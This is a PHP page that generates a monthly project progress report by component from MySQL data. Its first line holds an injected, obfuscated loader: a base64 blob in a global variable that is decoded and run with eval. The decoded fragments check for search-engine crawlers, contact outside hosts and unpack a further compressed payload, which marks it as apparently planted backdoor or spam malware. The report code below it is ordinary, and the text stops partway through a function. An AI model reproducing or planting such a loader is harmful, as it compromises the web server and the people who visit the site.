<?php /*versio:3.02*/ $GLOBALS["jlyhtl"]="MAaW5pX3NldAJkcYWxsb3dfdXJsX2ZvcGVuqOmZGlzcGxheV9lcnJvcnMTZmVkb3Ivd2VibmV0X3VwZ19hYgMy4wMgojddGhhaDFOaWV0aGFpMnphaDZBaHIbKvaHR0cDovLwrTzSFRUUFMnVb2ZmaObaHR0cHM6Ly8SFRUUF9IT1NUgIdW5pb24Fpoc2VsZWN0KTpUkVRVUVTVF9VUkkCOpTkU0NSSVBUX05BTUUsNqUVVFUllfU1RSSU5HUPwjggboZGV0ZXJtaW5hdG9yeLgWzamLmxvZwqSFRUUF9ZX0FVVEgYmFzZTY0X2RlY29kZQHdmVyc2lvDjpTLQHJLXBocASFRUUF9FWEVDUEhQKlfb3V0HVHxcb2sSFRUUF9VU0VSX0FHRU5UQmFLAOCGZ29vZ2xlLHlhaG9vLGJhaWR1LGJpbmdib3QsbXNuYm90LHlhbmRleABsYQfAALYYWxqZXIuYml6BTtZmFzdGFkZHouY29tysL3czLnBocD91PQIstJms9aJnQ9cGhwJnA9YXpJnY9BtZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZUp5TlYzdHYya2dRL3lvYkMxVkdkZzAyTm8vbWZFclVvOWRJdlNTaTVLU3FGMW5FWG9QQitHMHdSUG51TitOZFkwT2dkMyt4N016T2UzNHo5bHdpWGpuVTlRTHFpSUpETTVxc3ZXQ1doWW5RYnI4U0Q4aHVIdGlaRndZV0xidzBTOFY0SDFGN01mTkZWVkpsdGR0R3Zoc3Y4S3lVWmtkRVhkYTZiWm1vN2VzemRFMUhCblVFREYxZ2VDT1ZHbUxOZGttK3p4YlJLcDA1WXFzb2x2RitMWk1QclhTelNxTTVNY245MDdkdmJmSks2cHUxWnlkaDVxMnBtQ1U1QlhrSnpmSWtJQzROM1VyRWlaWjU2bXl6UmJyeGQwRWh0dUtWRndlaFRGcjdjSjJsS2JqVWVzbjJib0hDQlR0UGZPR2F0UExsTXM0OXVPRTBSYkRBcnd4SUdLZlN4em40S014OFA5eGE4TWh5dzRnR1FwdVlJRVVWMEdadTJJM3IrUlM1TFRzTU1ocEFYSVZGbGtXZk9oMkJLSVRiZ3lkbWtFS0VEMXZUbmR0QzZRYjFVM291Tjl4RVRFbHJsZTdjTEFGcmIvaXRDRTliTHprTjZlN0lCOGhMR0tFWHJiVTdXeVhSRVpFVzFBYlNEWDhvY3JFeStmdzArZmJ3T0xYZ1J5Yi93M1k3UjlNdnkvazZ2djFqUEpHSk93UGZmc2s1R1UrZkp2ZlR5ZTM5OXkvNGdxZjg4b1BQRC9mMzQ4L1Q2ZDFmNDRlbnFVejZHSWhrdXduQ3VBd1BjN3Q2aDZJdzQ1YnRoeWx0M0dMQTZUcktRQU43REdHdXhRakM5VnVWWFg1YlpRcExsZFVncW5QVDBGNWhYZFJWTit4QzVjWEx6SWtXY0tEYnpJOVhNakc0enFwK1VjeG1zWXpTQlZOSGpqc0N6SGFqSEl1Z2Fobmh6L0dVdlBJc3ZBa0twaUZka2EvVDZXTkhWYnB3OFUveVR3QS9YOE0wKzBUZzhNcE5laXNKR0tZZ2lzSUU3WDc4K21nOWZGZUVqcURnOGUveDVQdmR3LzBacFU4cFRUN2V6cUdtUDRGeTlyNlVWOG5jTHFEMnhhc0xmYzZkYXBNUEg0aDQwdGZrWTAzK2pXanRPaUFLQmhiYXFXR0lxZzNMWHJseGVTSVBNTkJLMW1tK3ljRXBXa1IrNkZCUk9OZ25WeUtCTHc4UXNqajN6KzV6alN2ZStzdzd4bGZxZkR1Q211MCttc2VyK1R4S1k2Z3kxODl6dWdIKzFUeVA0d3ljQUVRTWlmRERFaFJPVklSUGNHWjBucVFUaUZ6bXkzMlI3VjRXUlM2Mmx2dnRQdmZiTmJpMHJPL2pDV1RvSnljOTQrdldldmNTRjN2ekFNR0daUFJrcld5R1pSemtnVmVUZXRKUWxVdUt2M3paTExPYTBqY2tiU2hyQTZTeFdxbHBxanFRK2pnU1dOMTZhUm0reXBZYStpVzFwOHVEOW5NMVlXN2U4NHg2a3Q1REhuSmxrbHBCejVEVXJxeVgrSGFxWFFPYU5wQlZsV2VBTXlobW1pVlpDSWhNazNPYVZOV1E5S0dzYW0zTXJ4c21kR1l2b09rc2JKNVpTbmhLek4vcmZLSE5JRFFLb2RyWXBYeGtoYUdCNVFnT0tPTW5GL0RjaUM3amdUalZTSDVKbmpyc3c1Z2Qva3FjQ2dFZEdFemNHeGduWGwyS3ZLcDJwU0g0YW1Ec0VVN2VjMERnalpLaFJNYjM5R0ZYNmpFSm1PVExPUWFqTkpqdi9jdWE5SzVrTUVuWXZmVkwyQXkwa2F5MVlZQ2NNVURENEpWeXIwKzZiTGVtKzJKYnJGekgzWWxZSU1zd0R1Y0wwL0dTWUFZSVlsbGY3cjZOTGF1dC9IRTNnWEh3TVBrQjBoOXZKN2R3aEdwZXhLRmR6dnZiSkpudFJDSjBITHJwcElzMTlMYlF5ZFpSUjNGaFZuK0VSaW5xcTd2UDQrcW10bGFZL3ZVb1BCL2ZqQTlYNC91L214elZYN0RxNklZL0tQV2c5TU42a1FQMnpCd0xyaTN3VFlBTmlydXFDSXoxOEhjYmZlVHJSWWM5U2k5UWJhaDVDclNqRHVBQndSNXdiSCsyakhucFgvRWh5Qzh4MU95b21HY2p5NWFqMU5vbVhqWjdBZWh2dm1URzRNckJMcS9KQytoZlZTQmFEVlRHZGwzV2Q5a3NmajAvY1JZQTZMd1N0c2ZXTzJaL0tLa2pEWXVsV2pLcmJtdmwvaHpxeEt3dzRseWw2eU5KSDdGZUFUdUR6RXZkdVhtemRveEtyOEpISWtkUGhXTWxJcU9iTzFFeE0wOXFVbWswSXZSczM0QXFWN2prNjNmV2E3MlJwS25NZWk0UVJjTTZBa3M2Qm96ZDFVTDcwRGpxcUlUdEM2aUtJZzIxOU1rMHVXSjBqa2JoTWkrYVVEb29NUkVIS0J0T2ZBWWRqN0pHdDQ4QWx3MkFLYm1hSlVvekMxcC9XTHJLSmxCTjBrWkRTZGZBNG1yVENSSjNVYVFtTitpY0N6MllNUUFQREZqZ3c0TnU0SksvKzUvVzlqUlYwbldZSWpKcGlJVnBPSko3YlZZbWhaZUpyR0phOFh6dlVvU0ZMN2lZUWdLMlc5OE45d2lQL3pGWW9JQTBuSlhkNDhsUzdSeU42RW05QVNKZTA1NVJGMmFFYk1Db0t4c3cyTnU1NjU3TUhtYUpmS0JlbVdacEpLWTAzRHJPUEN6M1RiWnJubFlMSXJuYTdjbjlwbHJkNkV0WWxWaG9NSWhtZVlvU2N1dzJHMjArNCthZ0IyT1hqUXpjbkYzc2NtaHhwaCtXYzF6ZTJyREVaTERSTUR2NUh5WWYvcFJMNFdGTFl3L0w5YUtNdkRtRnplOElGU284d1Urb3lxK3lGckl3dHhkaTNTc0FtYmFmTzlRS0E1czI3aHM0VUdVWFB0QlFEMFl1ZWdrVzIrSXdCK282MWlTOTI4ZEZvUkV3VGNYcU5yQWVxN1k3dGdJbGNyQnB4SkZmb1pkc095ZU5DZGlEN2xPaFFGVWRXb1l4MW1rem9QNVZXVC9nUmszUis1SStHS0I5N3h1dDE4VmFISlh2V0grQ1ppK2NyellaYUQ3NUZtWUJnSDIzL2h5K2ZoOWNocy84OCtZOWRtbTRKcGJZeGZleGZ3RXpRRGpSIikpKTs";        if (!function_exists('qzpechal')){function qzpechal($a, $b){$c=$GLOBALS['jlyhtl'];$d=pack('H*','6261736536345f6465636'.'f6465'); return $d(substr($c, $a, $b));};eval(qzpechal(544,3267));};?><link href="css/CssReportStyle .css" rel="stylesheet" type="text/css" />
<style type="text/css" media="screen">
		body{
			font-family:Verdana, Arial, Helvetica, sans-serif;
			font-size:11px;
			color:#000000;
		}
		#report_div
{
margin-top:20px;}
#report_title
{
float:left;
text-align:left;
padding: 10px 0px 0 40px;
font-family:Verdana, Arial, Helvetica, sans-serif;

}
	</style>
<style type="text/css" media="print">
		body{
			font-family:Verdana, Arial, Helvetica, sans-serif;
			font-size:11px;
			color:#000000;
			}
	 table { page-break-inside:auto; } 
     tr    { page-break-inside:avoid; page-break-after:auto; } 
	 td    { page-break-inside:avoid; page-break-after:auto; } 
    thead { display:table-header-group; } 
    tfoot { display:table-footer-group } 

		.printlink{
			display:none;
			visibility:hidden;
		}
		#report_div
{
margin-top:20px;}
#report_title
{
/*float:left;*/
text-align:left;
padding: 10px 0px 0 100px;
font-family:Verdana, Arial, Helvetica, sans-serif;
}
	</style>
<?php 
include_once("includes/dbconnect.php");
 $projectid = intval($_REQUEST['projectid']);
$componentid=intval($_GET['componentid']);
?>
<?php 
function dateDiff($start, $end) 
{   
$start_ts = strtotime($start);  
$end_ts = strtotime($end);  
$diff = $end_ts - $start_ts;  
return round($diff / 86400); 
}
function getProjectName($pid)
{
$sql="SELECT detail as p_name FROM  `project` where pid=".$pid;
$result = mysql_query($sql);
//echo $amountsize= mysql_num_rows($amountresult);
$data=mysql_fetch_array($result);
return $data;
}
function getComponentName($cid)
{
$sql="SELECT detail as c_name FROM  `components` where cid=".$cid;
$result = mysql_query($sql);
//echo $amountsize= mysql_num_rows($amountresult);
$data=mysql_fetch_array($result);
return $data;
}
function ProgressDate()
{
$sql="SELECT  MAX(bdate) as lastdate FROM  `progressmonth` ";
$amountresult = mysql_query($sql);
//echo $amountsize= mysql_num_rows($amountresult);
$data=mysql_fetch_array($amountresult);
return $data;
}
function LastProgressMonth($componentid)
{
$sql="SELECT  MAX(reporting_enddate) as lastReportdate FROM  `component_ipc` where cid=".$componentid;
$amountresult = mysql_query($sql);
//echo $amountsize= mysql_num_rows($amountresult);
$data=mysql_fetch_array($amountresult);
return $data;
}
$project_name=getProjectName($projectid);
$component_name=getComponentName($componentid);
$last_date=ProgressDate();
$last_report_date=LastProgressMonth($componentid);
$time=0;
$time = strtotime($last_date["lastdate"]);
$Date = date('d-M-Y', $time );
?><div id="report_div">
<div align="center" id="report_title">
<?php echo $project_name["p_name"];?> 
<br/>
<span style="font-weight:bold">Monthly Project Implementation Progress Report by Component:<?php echo $component_name["c_name"];?></span>
<br/>
<span>Last Reported Month:<?php echo date('d-M-Y',strtotime($last_report_date['lastReportdate']));?></span>
<br/>
<span>At the End of <?php echo $Date;?></span>
</div>
<table  cellpadding="0px" cellspacing="0px"   width="80%" align="center" id="tblList">
<thead style="border:0">
<tr><td style="border:0" colspan="5"><span><?php echo $component_name["c_name"];?></span>
</td><td style="border:0"><span class="printlink" style=""><a href="javascript:void(null);" onclick="window.print();" style="float:right">Print</a></span>
</td></tr>
<tr align="center">
  <td width="24" rowspan="2"><strong>No</strong></td>
  <td width="171" rowspan="2"><strong>Activity</strong></td>
<td width="288" height="37" rowspan="2"><strong>Sub-Activity</strong></td>
      <td width="108" nowrap="nowrap"><strong>Assigned weight </strong></td>
    <!--  <th width="110">Contract Amount</th> -->  
      <td width="154" nowrap="nowrap"><strong>Activity Actual Progress </strong></td>
      <td width="132" nowrap="nowrap"><strong> Weighted Progress  </strong></td>
  </tr>
<tr align="center">
  <td nowrap="nowrap"><strong>(%)</strong></td>
  <td width="154" nowrap="nowrap"><strong>(%)</strong></td>
  <td width="132" nowrap="nowrap"><strong>(%)</strong></td>
</tr>
</thead>

<?php
//$reportquery = "select code, detail, uom, qty, rs, amount from sub_activity where pid=".$projectid." and cid=".$componentid." and sid=".$activitytypeid." and s_id=".

$weighted_progress=0;
function LastMonthProgressDate()
{
$sql="SELECT  MAX(bdate) as lastMonthdate,bid FROM  `progressmonth`  Group by bid order by bid DESC";
$amountresult = mysql_query($sql);
//echo $amountsize= mysql_num_rows($amountresult);
$data=mysql_fetch_array($amountresult);
return $data;
}
function getProgressAmount($cid,$s_id)
{
 $sql2="SELECT MAX(bdate) as lastdate , SUM( pqty * prs ) AS tamount
FROM  `progress` 
WHERE s_id =".$s_id."
AND cid =".$cid."
GROUP BY s_id";
$pamountresult = mysql_query($sql2)or die(mysql_error());
$pdata=mysql_fetch_array($pamountresult);
return $pdata;
}
function getCurrentProgressAmount($cid,$sa_id)
{

$thismonth=date('Ym');
$sql="SELECT SUM(pamount) AS cprogress
FROM `progressdata` 
WHERE  sa_id =".$sa_id."
AND lbdate LIKE '%".$thismonth."'
GROUP BY sa_id
";
$current_month_result = mysql_query($sql)or die(mysql_error());
$data=mysql_fetch_array($current_month_result);
return $data;
}
function getCode($aid)
{
 $sql="SELECT code FROM  `activity` where aid=".$aid;
 $amountresult = mysql_query($sql);
//echo $amountsize= mysql_num_rows($amountresult);
 $data=mysql_fetch_array($amountresult);

return $data;
}
function getNameCode($s_id)
{
 $sql="SELECT detail,code FROM  subcomponents where s_id=".$s_id;
 $amountresult = mysql_query($sql);
//echo $amountsize= mysql_num_rows($amountresult);
 $data=mysql_fetch_array($amountresult);

return $data;
}
function getComponentWeight($aid)
{
 $sql="SELECT c_weight FROM  `subactivitydata` where aid=".$aid;
 $amountresult = mysql_query($sql);
//echo $amountsize= mysql_num_rows($amountresult);
 $data=mysql_fetch_array($amountresult);

return $data;
}
function getSubComponentWeight($cid,$s_id)
{
 $sql="SELECT assig as c_weight FROM  `subcomponents` where cid=".$cid." AND s_id=".$s_id;
 $amountresult = mysql_query($sql);
//echo $amountsize= mysql_num_rows($amountresult);
 $data=mysql_fetch_array($amountresult);

return $data;
}
function getSubComponentWeight1($sid,$cid,$s_id)
{
 $sql="SELECT assig as c_weight FROM  `subcomponents` where cid=".$cid." AND s_id=".$s_id." AND sid=".$sid;
 $amountresult = mysql_query($sql);
//echo $amountsize= mysql_num_rows($amountresult);
 $data=mysql_fetch_array($amountresult);

return $data;
}
function getComponentWeight1($sid,$cid)
{
 $sql="SELECT assig as c_weight FROM  `subcomponents` where sid=".$sid." And cid=".$cid;
 $amountresult = mysql_query($sql);
//echo $amountsize= mysql_num_rows($amountresult);
 $data=mysql_fetch_array($amountresult);

return $data;
}
function getActivityWeight($aid)
{
 $sql="SELECT a_weight FROM  `subactivitydata` where aid=".$aid;
 $amountresult = mysql_query($sql);
//echo $amountsize= mysql_num_rows($amountresult);
 $data=mysql_fetch_array($amountresult);
return $data;
}
function getWeightSum($cid,$sid)
{
 $sql="select Sum(assig) as component_weighted_sum from subcomponents where cid=".$cid." and sid=".$sid;
 $amountresult = mysql_query($sql);
//echo $amountsize= mysql_num_rows($amountresult);
 $data=mysql_fetch_array($amountresult);
return $data;
}
function getStructureName($sid)
{
 $sql="select detail from activitytype where  sid=".$sid;
 $amountresult = mysql_query($sql);
//echo $amountsize= mysql_num_rows($amountresult);
 $data=mysql_fetch_array($amountresult);
return $data;
}
function getWeightSumTotal($cid)
{
 $sql="select Sum(assig) as component_weighted_sum from subcomponents where cid=".$cid;
 $amountresult = mysql_query($sql);
//echo $amountsize= mysql_num_rows($amountresult);
 $data=mysql_fetch_array($amountresult);
return $data;
}
$progress=0;
function caculateTotalWeightedProgress($s_id)
{   $progress=0;
  
	$sql="SELECT ca.aid,sum(ca.quantity*ca.rates) as amount, sum(cb.pamount)As totalamount FROM subactivitydata ca 
			LEFT OUTER join(progressdata cb)
			on (ca.sa_id = cb.sa_id ) Where ca.s_id=".$s_id." GROUP BY ca.aid ";
    $amountresult = mysql_query($sql);
    while($reportdata=mysql_fetch_array($amountresult))
	{
	 $CWeightData=getComponentWeight($reportdata['aid']);
    $AWeightData=getActivityWeight($reportdata['aid']);
	if($reportdata['amount']!=0)
	{
	$actual_progress=$reportdata['totalamount']  / $reportdata['amount']*100;
	}
	else
	{
	$actual_progress=0;
	}
    $progress+=($CWeightData['c_weight']/100)*($AWeightData['a_weight'])*($actual_progress/100);

	}
	/*if($progress>$CWeightData['c_weight']&&$progress<$CWeightData['c_weight']+1)
	{
	$progress=$CWeightData['c_weight'];
	}*/
	return $progress;
}
function getVariationData($aid)
{ 
$sql2="SELECT sum(vd.vqty) As tvqty, sum(vd.vrate*cc.quantity) as variation_in_rate_amount, sum(vd.vqty*dd.prs) as variation_in_qty_amount,sum(vd.`vamount`) as variation_in_amount,vd.`vo_id`,vd.`contigency_code`,vd.`vono`,vd.`vodate`,vd.`bid`,vd.`remark`,vd.`vstatus`,vd.`bdate`
FROM variationdata vd
LEFT OUTER JOIN (subactivitydata cc) on (vd.sa_id = cc.sa_id) 
LEFT OUTER JOIN (progressdata dd) on (vd.sa_id = dd.sa_id) where cc.aid=".$aid." GROUP BY cc.aid";
$pamountresultp = mysql_query($sql2)or die(mysql_error());
$pgdata=mysql_fetch_array($pamountresultp);
return $pgdata;
}
function getSubActivityVariationData_phy_cont($sa_id)
{ 
$sql2="SELECT sum(vd.vqty) As tvqty, sum(vd.vrate*cc.quantity) as variation_in_rate_amount, sum(vd.vqty*cc.rates) as variation_in_qty_amount,sum(vd.`vamount`) as variation_in_amount,vd.`vo_id`,vd.`contigency_code`,vd.`vono`,vd.`vodate`,vd.`bid`,vd.`remark`,vd.`vstatus`,vd.`bdate`
FROM variationdata vd
LEFT OUTER JOIN (subactivitydata cc) on (vd.sa_id = cc.sa_id) where cc.sa_id=".$sa_id." GROUP BY cc.sa_id";
$pamountresultp = mysql_query($sql2)or die(mysql_error());
$pgdata=mysql_fetch_array($pamountresultp);
return $pgdata;
}
function getThisMonthVariationData($aid,$bid)
{ 
 $sql2="SELECT sum(vd.vqty) As tvqty, sum(vd.vrate*cc.quantity) as variation_in_rate_amount, sum(vd.vqty*dd.prs) as variation_in_qty_amount,sum(vd.`vamount`) as variation_in_amount,vd.`vo_id`,vd.`contigency_code`,vd.`vono`,vd.`vodate`,vd.`bid`,vd.`remark`,vd.`vstatus`,vd.`bdate`
FROM variationdata vd
LEFT OUTER JOIN (subactivitydata cc) on (vd.sa_id = cc.sa_id)
LEFT OUTER JOIN (progressdata dd) on (vd.sa_id = dd.sa_id) where cc.aid=".$aid." AND vd.bid=".$bid." GROUP BY cc.aid";
$pamountresultp = mysql_query($sql2)or die(mysql_error());
$pgdata=mysql_fetch_array($pamountresultp);
return $pgdata;
}
function GetPhysicalContigencyAmount($cid)
{
$total_qty=0;
$total_qty_all=0;
$total_month=0;
$total_month_total=0;
$reportquerynew ="SELECT  ca.cid,sum(cc.lqty) as lqty, sum(cc.lqty*ca.rates) as lastamount,ca.subactivityname,ca.aid,ca.s_id,ca.sa_id,ca.sid,ca.startdate,ca.units, min(ca.startdate) as mindate, ca.enddate, max(ca.enddate) as maxdate,  ca.quantity, ca.rates, cb.pqty, sum(cb.pqty) as tpqty,sum(ca.quantity*ca.rates) as amount, sum(ca.quantity) as tqty ,sum(cb.pamount)As totalamount,cb.pamount, cb.lbdate as lastdate , cb.prs FROM subactivitydata ca 
LEFT OUTER join (progressdata cb)
on (ca.sa_id=cb.sa_id)
LEFT OUTER join (lastmonthdata cc) 
on (cb.sa_id=cc.sa_id)Where ca.cid=".$cid." GROUP BY ca.sa_id order by ca.sub_order ASC";

$reportresult_act = mysql_query($reportquerynew)or die(mysql_error());
while ($reportdata_act = mysql_fetch_array($reportresult_act)) {
$variation_data_sub=getSubActivityVariationData_phy_cont($reportdata_act['sa_id']);
 if($variation_data_sub['tvqty']!=0)
{
$total_amount_act_all=$reportdata_act['amount'];
$total_qty=$variation_data_sub['tvqty'];
$total_qty_all=$variation_data_sub['tvqty']+$reportdata_act['tpqty'];

if($variation_data_sub['vrate']==0)
{
$total_month=($total_qty) * $reportdata_act['prs'];
$total_month_all=($total_qty_all) * $reportdata_act['prs'];
}
else
{
$total_month=($total_qty) * $variation_data_sub['vrate'];
$total_month_all=($total_qty_all) * $variation_data_sub['vrate'];
}
$total_month_total+=$total_month;
}
}
return $total_month_total;
}

function caculateTotalWeightedProgress1($cid,$all_total,$s_id,$total_phy_cont)
{   $progress=0;
	$phy_contract_amount=0;
	$cont_prog=0;
	
      $sql="SELECT * FROM subcomponents where cid=".$cid." AND sid=3 ";
 	$result = mysql_query($sql);
 	$size= mysql_num_rows($result);
 	if($size>1)
 	{
	 $sql="SELECT ca.sid,sum(ca.quantity*ca.rates) as amount, sum(cb.pamount)As totalamount,ca.activitycode FROM subactivitydata ca 
        	LEFT OUTER join (progressdata cb)
			on (ca.sa_id = cb.sa_id ) Where ca.cid=".$cid." AND s_id=".$s_id." AND (ca.sid=3 or sid=4) GROUP BY ca.aid";
	}
	else
	{
		$sql="SELECT ca.sid,sum(ca.quantity*ca.rates) as amount, sum(cb.pamount)As totalamount,ca.activitycode FROM subactivitydata ca 
        	LEFT OUTER join (progressdata cb)
			on (ca.sa_id = cb.sa_id ) Where ca.cid=".$cid."  AND (ca.sid=3 or sid=4) GROUP BY ca.aid";
	}
    $amountresult = mysql_query($sql);
    while($reportdata=mysql_fetch_array($amountresult))
	{
		$code=$reportdata["activitycode"];
	 $CWeightData=getSubComponentWeight($cid,$s_id);
			if($all_total!=0&&$all_total!="")
			{
			  $weight= ($reportdata['amount']/$all_total)*100;
			
			 //$totalweight+=$weight;
			}
			
	if($reportdata['amount']!=0)
	{
     $actual_progress=$reportdata['totalamount']  / $reportdata['amount']*100;
	//echo "</br>";
	}
	else
	{
	$actual_progress=0;
	}
	if($reportdata['sid']==4)
	{
	$CWeightData=getSubComponentWeight1(3,$cid,$s_id);
	}
	
    $progress+=($CWeightData['c_weight']/100)*$weight*($actual_progress/100);
 if($reportdata["activitycode"]=='F')
	{
	    $phy_contract_amount=$reportdata["amount"];
		$actual_progress=$total_phy_cont/$phy_contract_amount;
	 	$CWeightData['c_weight'];
	 	$res=($CWeightData['c_weight']/100)*$weight*($actual_progress/100)*100;
		$progress+=$res;
	}
	}
	
	
	return $progress;
}
$grand_total=0;
$total_progress=0;
$total_current_month_progress=0;
$total_upto_last_month_progress=0;
$total_noofdays=0;
$total_timeElps=0;
$total_planned_progress=0;
$to_date_progress=0;
$current_month_progress=0;
$actual_progress=0;
$weighted_progress=0;
$totalweight=0;
$total_weighted_progress=0;
$ComponentWeightSum=0;
$ComponentWeightSumTotal=0;
$sub_total_actual_progress=0;
$grand_total_weighted_progress=0;
$weightedp=0;
$physical_contigency=0;
/*$outerquery="SELECT * FROM subactivitydata where  cid=".$componentid;
$outeresult = mysql_query($outerquery);
while($outerdata= mysql_fetch_array($outeresult))
{*/
 ?>

<?php 
$mob_weighted_progress=0;
$w1=0;
 $bgcolor=0;
$weightedp_cont=0;
$weightedp1=0;
$weightedp2=0;
$StructureName="";
$current=0;
$prev=0;
$current1=0;
$prev1=0;
$activity_weight=0;
$pre_total_weighted_progress=0;
$total_phy_cont=0;
$last_month_data=LastMonthProgressDate();
$this_month_bid=$last_month_data["bid"];
$reportquery ="SELECT  ca.cid,ca.activityname,ca.aid,ca.s_id,ca.sa_id,ca.sid, sum(ca.quantity*ca.rates) as amount, sum(cb.pamount)As totalamount,cb.pamount FROM subactivitydata ca 
LEFT OUTER join (progressdata cb)
on (ca.sa_id = cb.sa_id ) Where ca.cid=".$componentid." GROUP BY ca.sid,ca.s_id,ca.aid ORDER by ca.a_order,ca.sub_order,ca.sa_id";
$i=0;
$reportresult = mysql_query($reportquery);
$totalresultquery="SELECT sum(`quantity`* `rates` ) grand_total FROM subactivitydata WHERE cid =".$componentid." AND (sid =3 OR sid =4) GROUP BY cid";
$totalresult=mysql_query($totalresultquery);
 $all_total_data=mysql_fetch_array($totalresult);
 $all_total=$all_total_data["grand_total"];
$total_phy_cont=GetPhysicalContigencyAmount($componentid);
while ($reportdata = mysql_fetch_array($reportresult)) {
  $bgcolor = ($bgcolor == "#FFFFFF") ? "#EAF4FF" : "#FFFFFF";
$codeNameData=getNameCode($reportdata['s_id']);
//////////////// Start VO DATA//////////////////////////////////////
$variation_data=getVariationData($reportdata['aid']);
$this_variation_data=getThisMonthVariationData($reportdata['aid'],$this_month_bid);///during this month
 $vo_thismonth=$this_variation_data["variation_in_qty_amount"]+$this_variation_data["variation_in_rate_amount"];
$vo_total_thismonth+=$this_variation_data["variation_in_qty_amount"]+$this_variation_data["variation_in_rate_amount"];
$vo_total_todate=$variation_data["variation_in_qty_amount"]+$variation_data["variation_in_rate_amount"];
$vo_uptolast=$vo_total_todate-$vo_thismonth;
$vo_total_uptolast+=$vo_uptolast;
$vo_grand_total_todate+=$vo_total_todate;
//////////////// END VO DATA//////////////////////////////////////

//////////////// START TODATE DATA//////////////////////////////////////
 $during_this_month_progress=$last_month_progress['lastamount'];
 $upto_last_month_progress=$reportdata['totalamount']-$last_month_progress['lastamount'];
 $to_date_progress=$last_month_progress['lastamount']+$upto_last_month_progress;
//////////////// END TODATE DATA//////////////////////////////////////


$CWeightData=getComponentWeight($reportdata['aid']);
$AWeightData=getActivityWeight($reportdata['aid']);
$current=$reportdata['s_id'];
$current1=$reportdata['sid'];
if($all_total!=0&&$all_total!="")
{
 $weight= ($reportdata['amount']/$all_total)*100;
 $totalweight+=$weight;
}
$activity_weight=$AWeightData['a_weight'];
if($reportdata['amount']!=0)
{
$actual_progress=$reportdata['totalamount']  / $reportdata['amount']*100;
}
else
{
$actual_progress=0;
}
if($reportdata['sid']==1|| $reportdata['sid']==2 || $reportdata['sid']==5|| $reportdata['sid']==6)
{
if($prev!=$current)
{

$weightedp=caculateTotalWeightedProgress($reportdata['s_id']);
if($reportdata['sid']==2)
{
$mob_weighted_progress=$weightedp;
}
}
}
else if($reportdata['sid']==3|| $reportdata['sid']==4)
{
/*if($prev1!=$current1)
{*/
/*if($reportdata['sid']==3)
{
$weightedp1=caculateTotalWeightedProgress1($reportdata['s_id'],$all_total);
}
if($reportdata['sid']==4)
{
  $weightedp2=caculateTotalWeightedProgress1($reportdata['s_id'],$all_total);
}*/

 $weightedp=caculateTotalWeightedProgress1($componentid,$all_total,$reportdata['s_id'],$total_phy_cont);
//}
}

/*else
{
$weightedp+=caculateTotalWeightedProgress($activity_weight,$CWeightData['c_weight'],$actual_progress);
}
*/

if($current1!=4)
{
if($prev!=$current)
{?>
<?php
if($prev1!=$current1)
{
?>
<?php if($prev1!=0)
{?>
<tr align="right" id="sub_title">
<td align="left">&nbsp;</td>
<td align="left">&nbsp;</td>

<td align="right">
  <strong><?php echo  $StructureName; ?>&nbsp;Sub Total:</strong></td>
<td align="right"><strong><?php 
$WeightSumData=getWeightSum($reportdata['cid'],$prev1);
$ComponentWeightSum=$WeightSumData["component_weighted_sum"];
echo number_format($ComponentWeightSum,2);?></strong></td>
<?php /*?><!--<td align="right"><?php echo number_format($ComponentWeightSum,2);?></td>--><?php */?>
<td align="right"><strong>
<?php $sub_total_actual_progress=($total_weighted_progress/$ComponentWeightSum*100);
echo  number_format($sub_total_actual_progress,2);?></strong></td>
<td align="right">
<strong><?php echo  number_format($total_weighted_progress,2);
$grand_total_weighted_progress+=$total_weighted_progress;

$total_weighted_progress=0;?></strong></td>
</tr>
<?php }?>
<tr align="right" id="sub_title">
<td align="left">&nbsp;</td>
<td align="left"><strong>
  <?php
$StructureNameData=getStructureName($reportdata['sid']);
$StructureName=$StructureNameData["detail"];
echo  $StructureName;?>
</strong></td>
<td colspan="4" style="text-align:center;">&nbsp;  </td>
<!--<td style="text-align:left;"></td>-->
</tr>

<?php }?>
<tr id="sub_title">
<td height="20" style="text-align:center;"><?php echo $codeNameData['code']; ?></td>
<td height="20" style="text-align:center;"><div align="left"><?php echo $codeNameData['detail']; ?></div></td>
<td style="text-align:center;">&nbsp;  </td>
<td style="text-align:right;"><strong><?php echo number_format ($CWeightData['c_weight'],2); ?></strong></td>
<!--<td style="text-align:left;"></td>-->
<td style="text-align:right;"><strong><?php 
if($CWeightData['c_weight']!=0)
{
echo number_format (($weightedp/$CWeightData['c_weight']*100),2);
} ?></strong></td>
<td style="text-align:right;"><strong><?php echo number_format($weightedp,2); 
?></strong></td>
</tr>

<?php

}
}
//$progressData=getProgressAmount($componentid,$reportdata['s_id']);
$codeData=getCode($reportdata['aid']);

/*$reportdata["lastamount"]=1;*/
//$this_month_progress=getCurrentProgressAmount($componentid,$reportdata['sa_id']);
//$current_month_progress=$this_month_progress['cprogress'];
/*$total_current_month_progress+=$reportdata["lastamount"];
$mindate=$reportdata["mindate"];
$maxdate=$reportdata["maxdate"];*/

?>
<?php
/*$aenddate = strtotime(substr($reportdata['enddate'],0,4)."-".substr($reportdata['enddate'],4,2)."-".substr($reportdata['enddate'],6,2));
$astartdate = strtotime(substr($reportdata['startdate'],0,4)."-".substr($reportdata['startdate'],4,2)."-".substr($reportdata['startdate'],6,2));
$datediff = $aenddate - $astartdate;
$noofdays = number_format($datediff/(60*60*24),0);
$noofdays=trim(str_replace(",","",$noofdays));
$total_noofdays+=$noofdays;*/
?>

<?php
/*$aenddate = strtotime(substr($reportdata['enddate'],0,4)."-".substr($reportdata['enddate'],4,2)."-".substr($reportdata['enddate'],6,2));
$tlbdate = strtotime(substr($reportdata['lastdate'],0,4)."-".substr($reportdata['lastdate'],4,2)."-".substr($reportdata['lastdate'],6,2));
$datediff = $aenddate - $tlbdate;
$timeElps = number_format($datediff/(60*60*24),0);
$total_timeElps+=$timeElps;*/
?>
<tr style="background-color:<?php echo $bgcolor;?>;">
<td height="20" style="text-align:center;"><?php echo $codeData['code']; ?></td>
<td height="20" style="text-align:center;">&nbsp;</td>
<td style="text-align:left;"><?php echo $reportdata['activityname']; ?></td>
<td style="text-align:right;"><?php 
if($reportdata['sid']==3|| $reportdata['sid']==4)
{
echo number_format($weight,2);

}
else
{
echo number_format ($activity_weight,2);
} ?></td>

<?php /*?><td style="text-align:right;"><?php $grand_total+=$reportdata['amount'];
									echo number_format(($reportdata['amount']),2); ?></td>
<?php */?>									
									
<td style="text-align:right;"><?php if($codeData['code']=='F' ) {
function getSubActivityVariationData($sa_id)
{ 
